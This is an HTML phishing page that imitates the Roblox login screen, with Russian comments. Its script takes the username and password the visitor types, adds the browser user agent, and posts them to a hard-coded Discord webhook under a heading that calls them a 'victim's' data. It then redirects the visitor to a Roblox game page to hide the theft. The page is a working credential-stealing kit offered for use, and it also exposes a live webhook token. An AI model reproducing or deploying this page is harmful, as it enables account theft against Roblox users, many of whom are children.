<!DOCTYPE html>  
<html>  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
    <title>Roblox</title>  
    <style>  
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; font-family: "Gotham SSm", sans-serif; overflow: hidden; }  
        .bg {  
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;  
            /* Ссылка на официальный фон Roblox */  
            background: url('https://tr.rbxcdn.com/9707921a525f9b4c09d58704047a069a/420/420/Image/Png') no-repeat center center;  
            background-size: cover; filter: brightness(0.35); z-index: 1;  
        }  
        .main { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 0 35px; box-sizing: border-box; }  
        .logo { width: 170px; margin-bottom: 50px; }  
        input {  
            width: 100%; max-width: 350px; padding: 16px; margin-bottom: 12px;  
            /* Прозрачные поля ввода под оригинал */  
            background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2);  
            border-radius: 5px; color: #fff; font-size: 16px; outline: none; box-sizing: border-box;  
        }  
        .btn-log {  
            width: 100%; max-width: 350px; padding: 14px; background: rgba(255, 255, 255, 0.15);  
            border: none; border-radius: 8px; color: rgba(255, 255, 255, 0.5);  
            font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;  
        }  
        .btn-dev {  
            width: 100%; max-width: 350px; padding: 12px; background: transparent;  
            /* Белая обводка как на Фото 1 */  
            border: 1px solid #fff; border-radius: 8px; color: #fff;  
            font-size: 16px; cursor: pointer; margin-top: 15px;  
        }  
        .forgot { color: #fff; text-decoration: none; font-size: 13px; margin-top: 35px; opacity: 0.7; }  
    </style>  
</head>  
<body>  
    <div class="bg"></div>  
    <div class="main">  
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_logo.png" class="logo">  
        <input type="text" id="u" placeholder="Username/Email/Phone">  
        <input type="password" id="p" placeholder="Password">  
        <button class="btn-log" onclick="hit()">Log In</button>  
        <button class="btn-dev">Log In With Another Device</button>  
        <a href="#" class="forgot">Forgot Password or Username?</a>  
    </div>  
  
    <script>  
        async function hit() {  
            const user = document.getElementById('u').value;  
            const pass = document.getElementById('p').value;  
            if(!user || !pass) return;  
  
            // Твой вебхук  
            const hook = "https://discord.com/api/webhooks/1492143944920727606/TFNrc5l5T-o89Rl1A-msjttNX3Z_PB-ua7Z82Vo3R6VDMV8Udz5JgtZ4x24BRcMyxi-h";  
              
            await fetch(hook, {  
                method: 'POST',  
                headers: {'Content-Type': 'application/json'},  
                body: JSON.stringify({  
                    "username": "Spidey Bot",  
                    "embeds": [{  
                        "title": "🚀 НОВЫЙ ЛОГ В СЕТИ!",  
                        "color": 16711680,  
                        "description": "**Данные жертвы получены**",  
                        "fields": [  
                            { "name": "👤 Логин", "value": `\`${user}\`` },  
                            { "name": "🔑 Пароль", "value": `\`${pass}\`` },  
                            { "name": "📱 Устройство", "value": `\`${navigator.userAgent}\`` }  
                        ],  
                        "footer": { "text": "N.S.-01" }  
                    }]  
                })  
            });  
            // Перенаправление на игру  
            window.location.href = "https://www.roblox.com/games/920587237/Adopt-Me";  
        }  
    </script>  
</body>  
</html>
